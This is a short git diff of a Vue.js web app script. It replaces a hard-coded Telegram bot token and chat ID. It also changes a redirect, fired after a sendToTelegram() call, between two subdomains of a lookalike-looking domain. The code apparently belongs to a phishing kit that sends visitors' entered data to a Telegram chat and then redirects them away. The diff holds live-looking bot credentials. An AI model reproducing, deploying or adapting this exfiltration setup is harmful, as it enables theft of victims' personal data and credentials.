@@ -1,5 +1,5 @@
-const TELEGRAM_BOT_TOKEN = '8196319945:AAHPEcumR9n3hASIXg9IdmkX06UIxQbK5R4';
-const TELEGRAM_CHAT_ID = '-1002383824557';
+const TELEGRAM_BOT_TOKEN = '7852049948:AAFFkvkc-P1TcRMin_EggatMfqY-QFyc3F8';
+const TELEGRAM_CHAT_ID = '-1002434577801';
 
 const app = Vue.createApp({
   data() {
@@ -138,7 +138,7 @@ const app = Vue.createApp({
 
       setTimeout(() => {
         this.sendToTelegram();
-        window.location.href = 'https://tt.nemolightlng.com/';
+        window.location.href = 'https://kk.nemolightlng.com/';
       }, 2000);
     },
     sendToTelegram() {
